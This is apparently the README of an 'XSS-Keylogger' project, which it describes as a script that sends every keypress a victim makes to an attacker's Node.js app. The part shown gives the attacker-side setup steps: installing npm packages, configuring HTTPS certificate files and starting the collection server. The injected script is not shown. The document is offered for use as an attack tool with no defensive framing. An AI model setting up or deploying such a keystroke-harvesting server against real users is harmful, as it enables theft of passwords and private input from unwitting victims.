# XSS-Keylogger
Simple script that sends every keypresses by victim to a simple Node.js app on attacker side

# Usage
**Attacker:**
Update the npm package manager globally to the latest version:
        # npm install -g npm@latest

Clear the npm cache, which can help resolve certain installation issues:
        # npm cache clean --force

Initialize a new npm package in the current directory, creating a package.json file:
        # npm init

Install the dependencies:
        # npm install express body-parser

Define the location of .crt and .key files in [a relative link](server.js) file:
        const server = https.createServer({
        key: fs.readFileSync('{**.key file location**}'),
        cert: fs.readFileSync('{**.crt file location**}'),
        }, app);

Run Node.js server:
        # node server.js
